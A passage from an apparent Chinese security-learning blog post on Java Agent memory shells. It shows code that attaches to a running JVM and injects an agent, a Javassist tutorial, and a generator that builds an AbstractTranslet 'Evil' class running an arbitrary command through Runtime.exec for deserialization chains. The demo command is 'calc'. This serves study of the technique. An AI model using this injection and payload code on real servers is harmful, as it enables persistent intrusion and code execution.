</span><br><span class="line">  </span><br><span class="line">                <span class="comment">//连接指定JVM  </span></span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">virtualMachine</span> <span class="operator">=</span> VirtualMachine.attach(vmd.id());  </span><br><span class="line">                <span class="comment">//加载Agent  </span></span><br><span class="line">                virtualMachine.loadAgent(<span class="string">&quot;E:\\Coding\\Java\\Java-Agent-Memshell\\Agentmain\\target\\agentdemo-1.0-SNAPSHOT-jar-with-dependencies.jar&quot;</span>);  </span><br><span class="line">                <span class="comment">//断开JVM连接  </span></span><br><span class="line">                virtualMachine.detach();  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先运行目标 JVM，再运行 inject 类进行注入，最后结果如下，一开始是只输出 hello, world 的，运行 inject 之后就插入了 agent-main 方法：</p><img src="/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/successAgentMainInject.png" class><h3 id="动态修改字节码-Instrumentation"><a href="#动态修改字节码-Instrumentation" class="headerlink" title="动态修改字节码 Instrumentation"></a>动态修改字节码 Instrumentation</h3><p>在实现 premain 的时候，我们除了能获取到 agentArgs 参数，还可以获取 Instrumentation 实例，那么 Instrumentation 实例是什么，在聊这个之前要先简单了解一下 Javassist</p><h4 id="Javassist"><a href="#Javassist" class="headerlink" title="Javassist"></a>Javassist</h4><h5 id="什么是-Javassist"><a href="#什么是-Javassist" class="headerlink" title="什么是 Javassist"></a>什么是 Javassist</h5><p>Java 字节码以二进制的形式存储在 .class 文件中，每一个.class文件包含一个Java类或接口。Javaassist 就是一个用来处理Java字节码的类库。它可以在一个已经编译好的类中添加新的方法，或者是修改已有的方法，并且不需要对字节码方面有深入的了解。同时也可以通过手动的方式去生成一个新的类对象。其使用方式类似于反射。</p><h5 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h5><p><code>ClassPool</code>是<code>CtClass</code>对象的容器。<code>CtClass</code>对象必须从该对象获得。如果<code>get()</code>在此对象上调用，则它将搜索表示的各种源<code>ClassPath</code> 以查找类文件，然后创建一个<code>CtClass</code>表示该类文件的对象。创建的对象将返回给调用者。可以将其理解为一个存放<code>CtClass</code>对象的容器。</p><p>获得方法： <code>ClassPool cp = ClassPool.getDefault();</code>。通过 <code>ClassPool.getDefault()</code> 获取的 <code>ClassPool</code> 使用 JVM 的类搜索路径。<strong>如果程序运行在 JBoss 或者 Tomcat 等 Web 服务器上，ClassPool 可能无法找到用户的类</strong>，因为Web服务器使用多个类加载器作为系统类加载器。在这种情况下，<strong>ClassPool 必须添加额外的类搜索路径</strong>。</p><p><code>cp.insertClassPath(new ClassClassPath(&lt;Class&gt;));</code></p><h5 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h5><p>可以将其理解成加强版的Class对象，我们可以通过CtClass对目标类进行各种操作。可以<code>ClassPool.get(ClassName)</code>中获取。</p><h5 id="CtMethod"><a href="#CtMethod" class="headerlink" title="CtMethod"></a>CtMethod</h5><p>同理，可以理解成加强版的<code>Method</code>对象。可通过<code>CtClass.getDeclaredMethod(MethodName)</code>获取，该类提供了一些方法以便我们能够直接修改方法体</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">CtMethod</span> <span class="keyword">extends</span> <span class="title class_">CtBehavior</span> &#123;</span><br><span class="line">    <span class="comment">// 主要的内容都在父类 CtBehavior 中</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 父类 CtBehavior</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">CtBehavior</span> <span class="keyword">extends</span> <span class="title class_">CtMember</span> &#123;</span><br><span class="line">    <span class="comment">// 设置方法体</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBody</span><span class="params">(String src)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 插入在方法体最前面</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertBefore</span><span class="params">(String src)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 插入在方法体最后面</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertAfter</span><span class="params">(String src)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 在方法体的某一行插入内容</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">insertAt</span><span class="params">(<span class="type">int</span> lineNum, String src)</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传递给方法 <code>insertBefore()</code> ，<code>insertAfter()</code> 和 <code>insertAt()</code> 的 String 对象<strong>是由<code>Javassist</code> 的编译器编译的</strong>。 由于编译器支持语言扩展，以 $ 开头的几个标识符有特殊的含义：</p><img src="/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/javassist.png" class><h5 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h5><p><strong>pom.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.27.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>创建测试类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> javassist;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Javassist_Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Create_Person</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取 CtClass 对象的容器 ClassPool</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个新类 Javassist.Learning.Person</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;javassist.Person&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个类属性 name</span></span><br><span class="line">        <span class="type">CtField</span> <span class="variable">ctField1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(classPool.get(<span class="string">&quot;java.lang.String&quot;</span>), <span class="string">&quot;name&quot;</span>, ctClass);</span><br><span class="line">        <span class="comment">//设置属性访问符</span></span><br><span class="line">        ctField1.setModifiers(Modifier.PRIVATE);</span><br><span class="line">        <span class="comment">//将 name 属性添加进 Person 中，并设置初始值为 Drunkbaby</span></span><br><span class="line">        ctClass.addField(ctField1, CtField.Initializer.constant(<span class="string">&quot;Drunkbaby&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//向 Person 类中添加 setter 和 getter</span></span><br><span class="line">        ctClass.addMethod(CtNewMethod.setter(<span class="string">&quot;setName&quot;</span>, ctField1));</span><br><span class="line">        ctClass.addMethod(CtNewMethod.getter(<span class="string">&quot;getName&quot;</span>, ctField1));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个无参构造</span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">ctConstructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, ctClass);</span><br><span class="line">        <span class="comment">//设置方法体</span></span><br><span class="line">        ctConstructor.setBody(<span class="string">&quot;&#123;name = \&quot;Drunkbaby\&quot;;&#125;&quot;</span>);</span><br><span class="line">        <span class="comment">//向Person类中添加无参构造</span></span><br><span class="line">        ctClass.addConstructor(ctConstructor);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个类方法printName</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtMethod</span>(CtClass.voidType,<span class="string">&quot;printName&quot;</span>, <span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, ctClass);</span><br><span class="line">        <span class="comment">//设置方法访问符</span></span><br><span class="line">        ctMethod.setModifiers(Modifier.PRIVATE);</span><br><span class="line">        <span class="comment">//设置方法体</span></span><br><span class="line">        ctMethod.setBody(<span class="string">&quot;&#123;System.out.println(name);&#125;&quot;</span>);</span><br><span class="line">        <span class="comment">//将该方法添加进Person中</span></span><br><span class="line">        ctClass.addMethod(ctMethod);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将生成的字节码写入文件</span></span><br><span class="line">        ctClass.writeFile(<span class="string">&quot;E:\\Coding\\Java\\Java-Agent-Memshell\\Instrumentation\\src\\main\\java&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Create_Person();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>生成的 Person.class 如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> javassist;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;Drunkbaby&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String var1)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = var1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = <span class="string">&quot;Drunkbaby&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">printName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由此延展的攻击面其实是，我们可以利用 Javassist 生成一个恶意的 <code>.class</code> 类，其实在 CC 链的时候也是可以这样子打的，但是我当时并没有学习 Javassist 的思路，只是通过 Path.get 获取恶意类。</p><h5 id="使用-Javassist-生成恶意-class"><a href="#使用-Javassist-生成恶意-class" class="headerlink" title="使用 Javassist 生成恶意 class"></a>使用 Javassist 生成恶意 class</h5><p>由于我们的恶意类需要继承<code>AbstractTranslet</code>类，并重写两个<code>transform()</code>方法。否则编译无法通过，无法生成<code>.class</code>文件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">shell</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">shell</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var2) &#123;</span><br><span class="line">            var2.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是该恶意类在执行过程中并没有用到重写的方法，所以我们可以直接使用Javassist从字节码层面来生成恶意class，跳过恶意类的编译过程。代码如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> javassist;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.File;  </span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilPayload</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplatesImpl(String cmd) &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();  </span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);  </span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);  </span><br><span class="line">            ctClass.setSuperclass(superClass);  </span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();  </span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +  </span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);  </span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();  </span><br><span class="line">            ctClass.defrost();  </span><br><span class="line">            <span class="keyword">return</span> bytes;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">writeShell</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">byte</span>[] shell = EvilPayload.getTemplatesImpl(<span class="string">&quot;Calc&quot;</span>);  </span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;S&quot;</span>));  </span><br><span class="line">        fileOutputStream.write(shell);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        writeShell();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成的恶意文件被我们输出到了 <code>S</code> 这个文件中，其实很多反序列化在用的时候，是没有把这个字节码提取保存出来，本质上还是可以保存的。</p><p>保存出来的文件代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  </span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA  </span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)  </span></span><br><span class="line"><span class="comment">//  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;Calc&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var1) &#123;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> &#123;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Instrumentation"><a href="#Instrumentation" class="headerlink" title="Instrumentation"></a>Instrumentation</h4><p>Instrumentation 是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent 通过这个类和目标 JVM 进行交互，从而达到修改数据的效果。</p><p>其在 Java 中是一个接口，常用方法如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Instrumentation</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer, <span class="type">boolean</span> canRetransform)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//删除一个类转换器</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">//在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">//判断一个类是否被修改</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 获取目标已经加载的类。</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getAllLoadedClasses();</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//获取一个对象的大小</span></span><br><span class="line">    <span class="type">long</span> <span class="title function_">getObjectSize</span><span class="params">(Object objectToSize)</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="ClassFileTransformer"><a href="#ClassFileTransformer" class="headerlink" title="ClassFileTransformer"></a>ClassFileTransformer</h5><p>转换类文件，该接口下只有一个方法：transform，重写该方法即可转换任意类文件，并返回新的被取代的类文件，在 java agent 内存马中便是在该方法下重写恶意代码，从而修改原有类文件代码逻辑，与 addTransformer 搭配使用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。  </span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer, <span class="type">boolean</span> canRetransform)</span>;</span><br></pre></td></tr></table></figure><h5 id="获取目标-JVM-已加载类"><a href="#获取目标-JVM-已加载类" class="headerlink" title="获取目标 JVM 已加载类"></a>获取目标 JVM 已加载类</h5><p>下面我们简单实现一个能够获取目标 JVM 已加载类的 <code>agentmain-Agent</code></p><p>Main 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello_Sleep</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;  </span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;  </span><br><span class="line">            hello();  </span><br><span class="line">            sleep(<span class="number">3000</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span>&#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Agent 主类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">agentmain_transform</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args, Instrumentation inst)</span> <span class="keyword">throws</span> InterruptedException, UnmodifiableClassException &#123;  </span><br><span class="line">        Class [] classes = inst.getAllLoadedClasses();  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//获取目标JVM加载的全部类  </span></span><br><span class="line">        <span class="keyword">for</span>(Class cls : classes)&#123;  </span><br><span class="line">            <span class="keyword">if</span> (cls.getName().equals(<span class="string">&quot;AgentShell.Sleep_Hello&quot;</span>))&#123;  </span><br><span class="line">  </span><br><span class="line">                <span 